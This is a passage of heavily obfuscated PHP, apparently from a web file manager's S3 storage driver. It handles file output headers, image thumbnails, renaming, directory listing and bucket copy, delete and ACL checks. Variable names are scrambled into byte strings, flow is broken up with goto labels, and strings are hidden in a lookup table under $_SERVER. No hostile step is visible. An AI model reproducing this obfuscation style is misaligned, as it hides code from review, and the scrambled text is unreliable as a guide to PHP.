$EØô™ïÌ¡¬[114])) { $A¯‰£âß½Ë = $A¯‰£âß½Ë . $EØô™ïÌ¡¬[115]; } if ($fÖÁğ¼ÓœÛ === !1 && !mime_support($A¯‰£âß½Ë)) { $fÖÁğ¼ÓœÛ = !0; $A¯‰£âß½Ë = $EØô™ïÌ¡¬[116]; } goto fÌĞŞ·…˜Ù; e²ñÂ‡‚¡µ: $EªîØ¥ Ò„ = 0; $C¡éñÑ½ó = $D•³ç›ìİÒ - 1; $E ×ğ°Í = $this->ext($eìĞƒøÜƒ±); goto CĞ©ÇîŒ»æ; BÚàŠŞ¶“Ø: $D•³ç›ìİÒ = $Bß±ª§´àº[$EØô™ïÌ¡¬[77]]; $FÆã¦î»µÄ = gmdate($EØô™ïÌ¡¬[106], $Bß±ª§´àº[$EØô™ïÌ¡¬[107]]); $eìĞƒøÜƒ± = $DµÚÀ›’ ? $DµÚÀ›’ : $this->iconvApp($Bß±ª§´àº[$EØô™ïÌ¡¬[28]]); goto e²ñÂ‡‚¡µ; Eöåš‹‚¬é: $D‘„ä¶ÀÕ = $this->getType() == $EØô™ïÌ¡¬[103]; $a¿²«ØîÍã = $GLOBALS[$EØô™ïÌ¡¬[6]][$EØô™ïÌ¡¬[84]][$EØô™ïÌ¡¬[91]][$EØô™ïÌ¡¬[104]]; $F¥…Ö¬ÎÏ = (double) $GLOBALS[$EØô™ïÌ¡¬[6]][$EØô™ïÌ¡¬[84]][$EØô™ïÌ¡¬[91]][$EØô™ïÌ¡¬[105]] * 1024 * 1024; goto eŞÒ¾£º“Ö; eŞÒ¾£º“Ö: @ob_end_clean(); set_timeout(); $Bß±ª§´àº = $this->infoFull($eĞˆ©•é„†); goto BÚàŠŞ¶“Ø; DŸ‹Ğ‘Ä²Í: $EØô™ïÌ¡¬ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->cacheMethod(null, null); if (!$eĞˆ©•é„† || !$this->exist($eĞˆ©•é„†)) { show_json(LNG($EØô™ïÌ¡¬[102]), !1, $DµÚÀ›’); } goto Eöåš‹‚¬é; c±‘¦ÏÔ‰: header($EØô™ïÌ¡¬[132] . $FÆã¦î»µÄ . $EØô™ïÌ¡¬[124]); header($EØô™ïÌ¡¬[133] . $eìĞƒøÜƒ±); header($EØô™ïÌ¡¬[134]); goto C‹“èÒœõ; CĞ©ÇîŒ»æ: if (in_array($E ×ğ°Í, array($EØô™ïÌ¡¬[108], $EØô™ïÌ¡¬[109], $EØô™ïÌ¡¬[110], $EØô™ïÌ¡¬[111]))) { $E ×ğ°Í = $EØô™ïÌ¡¬[112]; } if (!$D¨îĞ‚Ò ) { $D¨îĞ‚Ò  = md5($FÆã¦î»µÄ . $this->hashSimple($eĞˆ©•é„†)); } $D¨îĞ‚Ò  = $EØô™ïÌ¡¬[113] . $D¨îĞ‚Ò  . $EØô™ïÌ¡¬[113]; goto AùùÀ£‘ïÏ; eô‡Ä‡äŸ: } public function fileOutServer($E±ÂËï²Éƒ, $EİÇõÌ­Ò± = false, $EòŸ—Ş„±¦ = false, $B­åÒ¿œ‹ = '') { $this->fileOut($E±ÂËï²Éƒ, $EİÇõÌ­Ò±, $EòŸ—Ş„±¦, $B­åÒ¿œ‹); } public function fileOutLink($FšêÓ›¸†) { header($_SERVER[ÚŠ•´ÍéÒÑÔ][153] . $FšêÓ›¸†); die; } public function cacheMethod($F‘¤ĞÄ’¡İ, $dÜğâŒØÄ¤) { goto då“ŞÓïä; C†ƒÑ÷”¹‰: if (!is_null($d ÛòÓë¾)) { return $d ÛòÓë¾; } $d ÛòÓë¾ = $this->{$F‘¤ĞÄ’¡İ}($dÜğâŒØÄ¤); $Bğ³¸Åá‚[$a“¾Ë×ÀğÌ] = $d ÛòÓë¾; goto EÓğàñº³; Fº¬áøä‘: if (is_null($F‘¤ĞÄ’¡İ)) { $Bğ³¸Åá‚ = array(); return; } if (is_null($dÜğâŒØÄ¤)) { unset($Bğ³¸Åá‚[$a“¾Ë×ÀğÌ]); return; } $d ÛòÓë¾ = isset($Bğ³¸Åá‚[$a“¾Ë×ÀğÌ]) ? $Bğ³¸Åá‚[$a“¾Ë×ÀğÌ] : null; goto C†ƒÑ÷”¹‰; då“ŞÓïä: $Fˆ‰¼¨äù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; static $Bğ³¸Åá‚ = array(); $a“¾Ë×ÀğÌ = $Fˆ‰¼¨äù[154] . $F‘¤ĞÄ’¡İ . $Fˆ‰¼¨äù[155] . rtrim($dÜğâŒØÄ¤, $Fˆ‰¼¨äù[8]); goto Fº¬áøä‘; EÓğàñº³: return $d ÛòÓë¾; goto bô”ô¨‰ì›; bô”ô¨‰ì›: } public function fileOutImage($FÇ®ĞŒé›½, $C¢¨‹êª = 250) { goto aèİØòš; aèİØòš: $D—Ğ¢Ë =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (substr($FÇ®ĞŒé›½, 0, 4) == $D—Ğ¢Ë[143]) { $this->fileOutLink($FÇ®ĞŒé›½); } $eÊ—Æô„„ = $this->info($FÇ®ĞŒé›½); goto CÜÌèáõ¡; d°ö×¯ÂØ: if (!($C‰îÑĞ¥¤’ = IO::move($bŞêÆÙ¨Ìˆ, $båµ™Ä±à·))) { return IO::fileOut($bŞêÆÙ¨Ìˆ); } del_file($bŞêÆÙ¨Ìˆ); IO::fileOut($C‰îÑĞ¥¤’); goto E«Ëç—°ä; C¾º—Æñ: $bŞêÆÙ¨Ìˆ = DATA_THUMB . $B¡äßÀÍì˜; if (!@file_exists($bŞêÆÙ¨Ìˆ)) { $A¡‚ÀÌÑİ = TEMP_FILES; if (!is_dir($A¡‚ÀÌÑİ)) { mk_dir($A¡‚ÀÌÑİ); } $D¬¾¹Ñ“ = $A¡‚ÀÌÑİ . $fË—¼ŸĞïø . $D—Ğ¢Ë[93] . $eÊ—Æô„„[$D—Ğ¢Ë[157]]; if (!@file_exists($D¬¾¹Ñ“)) { $D¬¾¹Ñ“ = $this->download($FÇ®ĞŒé›½, $D¬¾¹Ñ“); } $E´²öä†”£ = new ImageThumb($D¬¾¹Ñ“, $D—Ğ¢Ë[164]); $E´²öä†”£->prorate($bŞêÆÙ¨Ìˆ, $C¢¨‹êª, $C¢¨‹êª * 10); } if (!file_exists($bŞêÆÙ¨Ìˆ) || filesize($bŞêÆÙ¨Ìˆ) < 100) { return @file_exists($D¬¾¹Ñ“) ? IO::fileOut($D¬¾¹Ñ“) : $this->fileOut($FÇ®ĞŒé›½); } goto d°ö×¯ÂØ; CÜÌèáõ¡: if ($eÊ—Æô„„[$D—Ğ¢Ë[77]] <= 1024 * 50 || !function_exists($D—Ğ¢Ë[156]) || $eÊ—Æô„„[$D—Ğ¢Ë[157]] == $D—Ğ¢Ë[158]) { return $this->fileOut($FÇ®ĞŒé›½); } if (isset($eÊ—Æô„„[$D—Ğ¢Ë[159]][$D—Ğ¢Ë[160]])) { $fË—¼ŸĞïø = $eÊ—Æô„„[$D—Ğ¢Ë[159]][$D—Ğ¢Ë[160]]; } else { if (isset($eÊ—Æô„„[$D—Ğ¢Ë[159]][$D—Ğ¢Ë[161]])) { $fË—¼ŸĞïø = $eÊ—Æô„„[$D—Ğ¢Ë[159]][$D—Ğ¢Ë[161]]; } else { $fË—¼ŸĞïø = md5("{$eÊ—Æô„„[$D—Ğ¢Ë[28]]}\137{$eÊ—Æô„„[$D—Ğ¢Ë[75]]}\x5f{$eÊ—Æô„„[$D—Ğ¢Ë[77]]}"); } } $B¡äßÀÍì˜ = "{$fË—¼ŸĞïø}\x5f{$C¢¨‹êª}\56\x70\x6e\x67"; goto aÑÍ™¶Úß¥; aÑÍ™¶Úß¥: if (!($e°å¥§¿‚ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $D—Ğ¢Ë[162]))) { $båµ™Ä±à· = IO::mkdir(IO_PATH_SYSTEM_TEMP . $D—Ğ¢Ë[163]); } else { $båµ™Ä±à· = KodIO::make($e°å¥§¿‚); } if ($e°å¥§¿‚ = IO::fileNameExist($båµ™Ä±à·, $B¡äßÀÍì˜)) { $bŞêÆÙ¨Ìˆ = KodIO::make($e°å¥§¿‚); return IO::fileOut($bŞêÆÙ¨Ìˆ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto C¾º—Æñ; E«Ëç—°ä: } public function fileOutImageServer($bÜÆŸ§¡“ô, $C÷ØœŒÙ¼‡ = 250) { $this->fileOutImage($bÜÆŸ§¡“ô, $C÷ØœŒÙ¼‡); } public function fileNameAuto($d²¤‹Ğ»ê£, $cˆ™ğĞÔ»», $b™Ğ›ÑĞ = REPEAT_RENAME, $E©ƒŠø‡ = false) { goto BŒïæÛî×; BŒïæÛî×: $D¸©¥Õ¤ç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Cèìê”©¬ = $d²¤‹Ğ»ê£ === $D¸©¥Õ¤ç[33] ? $cˆ™ğĞÔ»» : rtrim($d²¤‹Ğ»ê£, $D¸©¥Õ¤ç[8]) . $D¸©¥Õ¤ç[8] . $cˆ™ğĞÔ»»; if ($b™Ğ›ÑĞ == REPEAT_REPLACE || !$this->exist($Cèìê”©¬) || $E©ƒŠø‡ && $b™Ğ›ÑĞ != REPEAT_RENAME_FOLDER) { return $cˆ™ğĞÔ»»; } goto AˆÑÄ«ÑÆ; E´¥¤ãõë…: $Eš™¡ò¼£ò = 1; $d”ğ„Ë÷Ì = substr($cˆ™ğĞÔ»», 0, strlen($cˆ™ğĞÔ»») - strlen($a—Ú‡Êàñº)); $c®›¾øğ“ = $d”ğ„Ë÷Ì . "\x28{$Eš™¡ò¼£ò}\51{$a—Ú‡Êàñº}"; goto D™ÄÍÌ›İÉ; D™ÄÍÌ›İÉ: while ($this->exist(rtrim($d²¤‹Ğ»ê£, $D¸©¥Õ¤ç[8]) . $D¸©¥Õ¤ç[8] . $c®›¾øğ“)) { $c®›¾øğ“ = $d”ğ„Ë÷Ì . "\x28{$Eš™¡ò¼£ò}\51{$a—Ú‡Êàñº}"; $Eš™¡ò¼£ò++; } return $c®›¾øğ“; goto Fã÷¾ğ°ĞÂ; AˆÑÄ«ÑÆ: if ($b™Ğ›ÑĞ == REPEAT_SKIP) { return !1; } $a—Ú‡Êàñº = $D¸©¥Õ¤ç[93] . get_path_ext($cˆ™ğĞÔ»»); $a—Ú‡Êàñº = $a—Ú‡Êàñº == $D¸©¥Õ¤ç[93] || $E©ƒŠø‡ ? $D¸©¥Õ¤ç[33] : $a—Ú‡Êàñº; goto E´¥¤ãõë…; Fã÷¾ğ°ĞÂ: } public function listAllFiles($Dô¢Š…»Ğ¹, $cê¥·†³ßİ, $céÒÔƒÊ•æ = array()) { goto F…á´Öšå¹; cÈ³×ñ‡: foreach (array_unique($DŞÅÜ› ˜) as $aÈÜ†²Ã†¿) { $F½Ğ±‹ªªä = array($E»ŸŸ‹Ìˆ„[75] => $this->getPathOuter($E»ŸŸ‹Ìˆ„[8] . $Dô¢Š…»Ğ¹ . $E»ŸŸ‹Ìˆ„[8] . $aÈÜ†²Ã†¿), $E»ŸŸ‹Ìˆ„[76] => 1, $E»ŸŸ‹Ìˆ„[77] => 0); if (substr($aÈÜ†²Ã†¿, -1) != $E»ŸŸ‹Ìˆ„[8]) { $F½Ğ±‹ªªä[$E»ŸŸ‹Ìˆ„[76]] = 0; $DÖéİ¾Óá = $this->getPath($Dô¢Š…»Ğ¹ . $E»ŸŸ‹Ìˆ„[8] . $aÈÜ†²Ã†¿); $F½Ğ±‹ªªä[$E»ŸŸ‹Ìˆ„[77]] = isset($céÒÔƒÊ•æ[$DÖéİ¾Óá]) ? $céÒÔƒÊ•æ[$DÖéİ¾Óá] : $this->size($DÖéİ¾Óá); } $e¨ÅÖëóÊ¯[] = $F½Ğ±‹ªªä; } return $e¨ÅÖëóÊ¯; goto fÆˆ‘§’×Ç; aËŠËóŠœ¿: $Dô¢Š…»Ğ¹ = trim($Dô¢Š…»Ğ¹, $E»ŸŸ‹Ìˆ„[8]); foreach ($cê¥·†³ßİ as $aÈÜ†²Ã†¿) { $b¯õ£Ğ§¬ğ = ltrim(substr($aÈÜ†²Ã†¿, strlen($Dô¢Š…»Ğ¹)), $E»ŸŸ‹Ìˆ„[8]); $DŞÅÜ› ˜ = array_merge($DŞÅÜ› ˜, $this->slicePath($b¯õ£Ğ§¬ğ)); } $e¨ÅÖëóÊ¯ = array(); goto cÈ³×ñ‡; F…á´Öšå¹: $E»ŸŸ‹Ìˆ„ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (empty($cê¥·†³ßİ)) { return array(); } $DŞÅÜ› ˜ = array(); goto aËŠËóŠœ¿; fÆˆ‘§’×Ç: } public function slicePath($B¼Óµ…É‰) { $eµºŞİí·Ó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÂÂ„Ñ‚ğ = explode($eµºŞİí·Ó[8], trim($B¼Óµ…É‰, $eµºŞİí·Ó[8])); $b´Öç¾Ÿ = 0; do { ++$b´Öç¾Ÿ; $EÁ‚ŒâèáÎ[] = implode($eµºŞİí·Ó[8], array_slice($aÂÂ„Ñ‚ğ, 0, $b´Öç¾Ÿ)) . $eµºŞİí·Ó[8]; } while ($b´Öç¾Ÿ < count($aÂÂ„Ñ‚ğ)); $EÁ‚ŒâèáÎ[count($aÂÂ„Ñ‚ğ) - 1] = $B¼Óµ…É‰; return $EÁ‚ŒâèáÎ; } public function getHost() { $fºÓ‚™Šù =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E¡Šà®Íõ = parse_url(trim($this->domain, $fºÓ‚™Šù[8])); $C‘Ó’ÚÌ = isset($E¡Šà®Íõ[$fºÓ‚™Šù[165]]) ? $E¡Šà®Íõ[$fºÓ‚™Šù[165]] : http_type(); $c¯’›ßöã½ = isset($E¡Šà®Íõ[$fºÓ‚™Šù[166]]) ? $E¡Šà®Íõ[$fºÓ‚™Šù[166]] : $E¡Šà®Íõ[$fºÓ‚™Šù[75]]; if (isset($E¡Šà®Íõ[$fºÓ‚™Šù[167]])) { $c¯’›ßöã½ .= $fºÓ‚™Šù[4] . $E¡Šà®Íõ[$fºÓ‚™Šù[167]]; } return $C‘Ó’ÚÌ . $fºÓ‚™Šù[168] . $c¯’›ßöã½; } public function pathEncode($BÖË¤¯©Ú) { $a¶Áèëã¸ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return str_replace($a¶Áèëã¸[169], $a¶Áèëã¸[8], rawurlencode($BÖË¤¯©Ú)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($bÍ™ÚèŒâ) { set_timeout(); require_once SDK_DIR . $_SERVER[ÚŠ•´ÍéÒÑÔ][170]; parent::__construct(); $this->_init($bÍ™ÚèŒâ); } public function _init($FšóÌó‡¨©) { foreach ($FšóÌó‡¨© as $CÛÛÁÔë‚æ => $DªÆÓªš…Û) { if (isset($this->{$CÛÛÁÔë‚æ})) { $this->{$CÛÛÁÔë‚æ} = $DªÆÓªš…Û; } } $this->endpoint = $FšóÌó‡¨©[$_SERVER[ÚŠ•´ÍéÒÑÔ][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($B÷æã×ËŸ¼ = "\166\64") { $this->signVer = $B÷æã×ËŸ¼; $this->client->setSignatureVersion($B÷æã×ËŸ¼); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto FîæÍøÚ’ì; FîæÍøÚ’ì: $A­Ì˜®¬œÖ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bàÓÚÉÜèÖ = $this->getBucketCors(); if (!$bàÓÚÉÜèÖ || !is_array($bàÓÚÉÜèÖ)) { return !1; } goto E‹÷‹ä§“«; a®ğ½µì‰‰: $CÛĞŒáÇ¥× = array($A­Ì˜®¬œÖ[177], $A­Ì˜®¬œÖ[178], $A­Ì˜®¬œÖ[179], $A­Ì˜®¬œÖ[180], $A­Ì˜®¬œÖ[181]); $CÑƒ©‡¸‚– = array_diff($CÛĞŒáÇ¥×, $bÖó°®´Ü˜); return empty($CÑƒ©‡¸‚–); goto f½ÜÒÛÉĞ; E‹÷‹ä§“«: if ($bàÓÚÉÜèÖ[$A­Ì˜®¬œÖ[172]] != $A­Ì˜®¬œÖ[173] || $bàÓÚÉÜèÖ[$A­Ì˜®¬œÖ[174]] != $A­Ì˜®¬œÖ[173]) { return !1; } $bÖó°®´Ü˜ = array_map($A­Ì˜®¬œÖ[175], $bàÓÚÉÜèÖ[$A­Ì˜®¬œÖ[176]]); if (!is_array($bÖó°®´Ü˜)) { $bÖó°®´Ü˜ = array(); } goto a®ğ½µì‰‰; f½ÜÒÛÉĞ: } public function mkfile($aºÏËÚ•‹Â, $eŞŠæ† = '', $Cİì‚İ…Š = REPEAT_RENAME) { $aÔÀÂ¨Ù‡ = $this->setContent($aºÏËÚ•‹Â, $eŞŠæ†); if ($aÔÀÂ¨Ù‡ !== !1) { return $this->getPathOuter($aºÏËÚ•‹Â); } return !1; } public function mkdir($dŒ¬’…†ˆ¼, $EÇ–Úƒ¯‹º = REPEAT_SKIP) { if (empty($dŒ¬’…†ˆ¼)) { return !1; } if ($this->_isFolder($dŒ¬’…†ˆ¼)) { return $this->getPathOuter($dŒ¬’…†ˆ¼); } $a“Œ±Ü„“ = $this->setContent($dŒ¬’…†ˆ¼, $_SERVER[ÚŠ•´ÍéÒÑÔ][33], !0); if ($a“Œ±Ü„“ !== !1) { return $this->getPathOuter($dŒ¬’…†ˆ¼); } return !1; } public function copyFile($f˜‡æõ³Å¼, $DÖâŞ×¿›©, $A°ø†óŒ’ = array()) { $cÌ¼½¹ë´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aàÃ‚åµõ = $this->objectMeta($f˜‡æõ³Å¼); if (!$aàÃ‚åµõ) { return !1; } if ($aàÃ‚åµõ[$cÌ¼½¹ë´[77]] <= 1024 * 1024 * 200) { $FÛÔà½¾Õõ = $this->client->copyObject($this->bucket, $f˜‡æõ³Å¼, $this->bucket, $DÖâŞ×¿›©, $cÌ¼½¹ë´[182], $A°ø†óŒ’); } else { $FÛÔà½¾Õõ = $this->client->multiCopyObject($this->bucket, $f˜‡æõ³Å¼, $this->bucket, $DÖâŞ×¿›©, $A°ø†óŒ’); } $FÛÔà½¾Õõ = $FÛÔà½¾Õõ ? $this->getPathOuter($DÖâŞ×¿›©) : !1; return $FÛÔà½¾Õõ; } public function moveFile($aÍ˜ê¼øïß, $b•¸ìì¥ğ) { if ($this->copyFile($aÍ˜ê¼øïß, $b•¸ìì¥ğ)) { $this->delFile($aÍ˜ê¼øïß); return $this->getPathOuter($b•¸ìì¥ğ); } return !1; } public function delFile($F—¦ìî°µ) { return $this->client->deleteObject($this->bucket, $F—¦ìî°µ); } public function delFolder($aíÊÚ¼“ß°) { goto d‘²¼äõÒÁ; cŠ±Š‡ÜÖğ: $cÜœÃÛğÆ¶ = $Cä¸…³—ì = 0; $bŒÕÜæ = array_chunk(array_keys($CØ¤”†º‹), 1000); foreach ($bŒÕÜæ as $fš×ƒÆèìß) { $cÜœÃÛğÆ¶++; $Cä¸…³—ì += (int) $this->client->deleteObjects($this->bucket, $fš×ƒÆèìß); } goto CĞ¥Çõª‰¾; d‘²¼äõÒÁ: $DˆÉĞíğÙ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CØ¤”†º‹ = $this->listObjs($aíÊÚ¼“ß°); if (!$CØ¤”†º‹) { $aíÊÚ¼“ß° = trim($aíÊÚ¼“ß°, $DˆÉĞíğÙ[8]); if (!empty($aíÊÚ¼“ß°)) { $aíÊÚ¼“ß° .= $DˆÉĞíğÙ[8]; } return $this->delFile($aíÊÚ¼“ß°); } goto cŠ±Š‡ÜÖğ; CĞ¥Çõª‰¾: return $cÜœÃÛğÆ¶ === $Cä¸…³—ì ? !0 : !1; goto C§…òñßâÙ; C§…òñßâÙ: } public function rename($b÷±ÙÒñ‰Â, $fäÎ…œ°ÂÉ) { return $this->renameObject($b÷±ÙÒñ‰Â, $fäÎ…œ°ÂÉ); } public function listPath($CâÍ‚î¯˜, $FÈĞ¯•¼ = false) { $EÆËÍÂŠ­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aÂŒç”ƒëô = $this->listObjs($CâÍ‚î¯˜, null, null, $EÆËÍÂŠ­[8]); $B¶¢ï¹ÛÊ· = array($EÆËÍÂŠ­[74] => array(), $EÆËÍÂŠ­[73] => array()); foreach ($aÂŒç”ƒëô as $aÎÛ“ ¼ÅØ => $EŸìçÃçõÂ) { if ($aÎÛ“ ¼ÅØ == $EÆËÍÂŠ­[8]) { continue; } if (isset($EŸìçÃçõÂ[$EÆËÍÂŠ­[183]])) { $B¶¢ï¹ÛÊ·[$EÆËÍÂŠ­[74]][] = $this->folderInfo($EŸìçÃçõÂ[$EÆËÍÂŠ­[183]], $FÈĞ¯•¼); } else { if (substr($EŸìçÃçõÂ[$EÆËÍÂŠ­[28]], -1) == $EÆËÍÂŠ­[8]) { continue; } $B¶¢ï¹ÛÊ·[$EÆËÍÂŠ­[73]][] = $this->fileInfo($EŸìçÃçõÂ[$EÆËÍÂŠ­[28]], $FÈĞ¯•¼, $EŸìçÃçõÂ); } } return $B¶¢ï¹ÛÊ·; } private function fileInfo($a¯×ÖŠ‰ª˜, $DÇÏòØ‹ªğ = false, $DìÌ¼ = array()) { goto b…õ‹±¾î¸; cùù‹Ã”ª: if (empty($DìÌ¼)) { $DìÌ¼ = $this->objectMeta($a¯×ÖŠ‰ª˜); if (!$DìÌ¼) { return $cÊÚ‹ÅÏ±Â; } } if (isset($DìÌ¼[$f–ÇÀÄÙ–ø[187]])) { $cÊÚ‹ÅÏ±Â[$f–ÇÀÄÙ–ø[107]] = $DìÌ¼[$f–ÇÀÄÙ–ø[187]]; } if (isset($DìÌ¼[$f–ÇÀÄÙ–ø[77]])) { $cÊÚ‹ÅÏ±Â[$f–ÇÀÄÙ–ø[77]] = $DìÌ¼[$f–ÇÀÄÙ–ø[77]]; } goto Aº¾ùÛÎê‡; Aº¾ùÛÎê‡: return $cÊÚ‹ÅÏ±Â; goto b¸µ°±âëé; b…õ‹±¾î¸: $f–ÇÀÄÙ–ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($DÇÏòØ‹ªğ) { return array($f–ÇÀÄÙ–ø[28] => $this->pathThis($a¯×ÖŠ‰ª˜), $f–ÇÀÄÙ–ø[75] => $this->getPathOuter($a¯×ÖŠ‰ª˜), $f–ÇÀÄÙ–ø[29] => $f–ÇÀÄÙ–ø[164], $f–ÇÀÄÙ–ø[157] => $this->ext($a¯×ÖŠ‰ª˜), $f–ÇÀÄÙ–ø[77] => isset($DìÌ¼[$f–ÇÀÄÙ–ø[77]]) ? $DìÌ¼[$f–ÇÀÄÙ–ø[77]] : 0, $f–ÇÀÄÙ–ø[184] => 0, $f–ÇÀÄÙ–ø[107] => 0, $f–ÇÀÄÙ–ø[185] => !0, $f–ÇÀÄÙ–ø[186] => !0); } $cÊÚ‹ÅÏ±Â = array($f–ÇÀÄÙ–ø[28] => $this->pathThis($a¯×ÖŠ‰ª˜), $f–ÇÀÄÙ–ø[75] => $this->getPathOuter($a¯×ÖŠ‰ª˜), $f–ÇÀÄÙ–ø[29] => $f–ÇÀÄÙ–ø[164], $f–ÇÀÄÙ–ø[184] => 0, $f–ÇÀÄÙ–ø[107] => 0, $f–ÇÀÄÙ–ø[77] => 0, $f–ÇÀÄÙ–ø[157] => $this->ext($a¯×ÖŠ‰ª˜), $f–ÇÀÄÙ–ø[185] => !0, $f–ÇÀÄÙ–ø[186] => !0); goto cùù‹Ã”ª; b¸µ°±âëé: } private function folderInfo($F¢“ŠŠ¢, $c¢ğëÔÌÕ = false) { goto d–¼æôÛàŸ; d–¼æôÛàŸ: $AÔæå‚¿ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($c¢ğëÔÌÕ) { return array($AÔæå‚¿[28] => $this->pathThis($F¢“ŠŠ¢), $AÔæå‚¿[75] => $this->getPathOuter($AÔæå‚¿[8] . $F¢“ŠŠ¢), $AÔæå‚¿[29] => $AÔæå‚¿[76], $AÔæå‚¿[185] => !0, $AÔæå‚¿[186] => !0); } $FŠ´œ’¹™» = array($AÔæå‚¿[28] => $this->pathThis($F¢“ŠŠ¢), $AÔæå‚¿[75] => $this->getPathOuter($AÔæå‚¿[8] . $F¢“ŠŠ¢), $AÔæå‚¿[29] => $AÔæå‚¿[76], $AÔæå‚¿[184] => 0, $AÔæå‚¿[107] => 0, $AÔæå‚¿[185] => !0, $AÔæå‚¿[186] => !0); goto cÛ‚Ã¯³ƒÄ; cÛ‚Ã¯³ƒÄ: if ($F¢“ŠŠ¢ == $AÔæå‚¿[33]) { return $FŠ´œ’¹™»; } $F¢“ŠŠ¢ = trim($F¢“ŠŠ¢, $AÔæå‚¿[8]) . $AÔæå‚¿[8]; $Fô¥ÛÈ”Å = $this->objectMeta($F¢“ŠŠ¢); goto E»Óæ½Ç‘í; E»Óæ½Ç‘í: if (isset($Fô¥ÛÈ”Å[$AÔæå‚¿[187]])) { $FŠ´œ’¹™»[$AÔæå‚¿[184]] = $Fô¥ÛÈ”Å[$AÔæå‚¿[187]]; } return $FŠ´œ’¹™»; goto E³Ü·µëÀÓ; E³Ü·µëÀÓ: } public function listObjs($FòÒ‘‡»ì, $c¥† è…ì± = null, $BÊËççÂ”Ç = null, $c±ìÛò¹Ñ = null) { $DÅòÙ´ó­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FòÒ‘‡»ì = trim($FòÒ‘‡»ì, $DÅòÙ´ó­[8]); $AŠš¿“´É÷ = empty($FòÒ‘‡»ì) ? $DÅòÙ´ó­[33] : $FòÒ‘‡»ì . $DÅòÙ´ó­[8]; return $this->client->getBucket($this->bucket, $AŠš¿“´É÷, $c¥† è…ì±, $BÊËççÂ”Ç, $c±ìÛò¹Ñ, !0); } public function has($A³ööÌÚ», $EæÔîòÉÂç = false, $aõ¾Î‡õ§ = true) { goto e«†ğ½«¼„; A…½”‹Ü¦: if ($EæÔîòÉÂç) { return array($Aâ§ÒâåÉ¿[188] => $F®™ÕÇºËÀ, $Aâ§ÒâåÉ¿[189] => $DâÚ•äèª); } return !1; goto d‹’¯ä½õÌ; e«†ğ½«¼„: $Aâ§ÒâåÉ¿ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F®™ÕÇºËÀ = 0; $DâÚ•äèª = 0; goto AÇ•‰Ê„¿é; AÇ•‰Ê„¿é: $Fƒğ„¥•ç = $this->listObjs($A³ööÌÚ», null, null, $Aâ§ÒâåÉ¿[8]); $Fƒğ„¥•ç = is_array($Fƒğ„¥•ç) ? $Fƒğ„¥•ç : array(); foreach ($Fƒğ„¥•ç as $b†˜òÆÃô) { if (isset($b†˜òÆÃô[$Aâ§ÒâåÉ¿[28]]) && substr($b†˜òÆÃô[$Aâ§ÒâåÉ¿[28]], -1) != $Aâ§ÒâåÉ¿[8]) { if (!$EæÔîòÉÂç && $aõ¾Î‡õ§) { return !0; } $F®™ÕÇºËÀ++; } else { if (isset($b†˜òÆÃô[$Aâ§ÒâåÉ¿[183]])) { if (!$EæÔîòÉÂç && !$aõ¾Î‡õ§) { return !1; } $DâÚ•äèª++; } } } goto A…½”‹Ü¦; d‹’¯ä½õÌ: } public function listAll($fƒ¢Â‘Îá) { $c¯ğÙ¹¤¡Ü =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÄÂ‡«‹¤Ê = $this->listObjs($fƒ¢Â‘Îá); $dÏ½Ç„…¾Ñ = $D›Êù‹Œ» = array(); foreach ($AÄÂ‡«‹¤Ê as $c£·†œ±’Œ => $E§õÔ¹Å¢) { $dÏ½Ç„…¾Ñ[] = $E§õÔ¹Å¢[$c¯ğÙ¹¤¡Ü[28]]; $D›Êù‹Œ»[$c£·†œ±’Œ] = $E§õÔ¹Å¢[$c¯ğÙ¹¤¡Ü[77]]; } return $this->listAllFiles($fƒ¢Â‘Îá, $dÏ½Ç„…¾Ñ, $D›Êù‹Œ»); } public function canRead($CËéÎÌ‰å½) { $AÅŞ¶ùŒŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Aœ±›¤Û = $this->client->getAccessControlPolicy($this->bucket, $CËéÎÌ‰å½); if (!$Aœ±›¤Û) { return !1; } return in_array($Aœ±›¤Û, array($AÅŞ¶ùŒŒ[190], $AÅŞ¶ùŒŒ[191], $AÅŞ¶ùŒŒ[192])) ? !0 : !1; } public function canWrite($B¹Ì¶Ğá®¾) { $CÑß›ŒŠÇª =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aŠµ§—‹é = $this->client->getAccessControlPolicy($this->bucket, $B¹Ì¶Ğá®¾); if (!$aŠµ§—‹é) { return !1; } return in_array($aŠµ§—‹é, array($CÑß›ŒŠÇª[190], $CÑß›ŒŠÇª[191])) ? !0 : !1; } public function getContent($F†˜ùù¨ÓÒ) { return $this->client->getObject($this->bucket, $F†˜ùù¨ÓÒ); } public function setContent($C—ÊĞ¦¾, $D£‡±´ÈâÕ = '', $e÷Öš† Ü´ = false) { goto CÜŠ½¦®Ø; CÜŠ½¦®Ø: $E•–Ğ§øôÔ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C—ÊĞ¦¾ = $e÷Öš† Ü´ ? 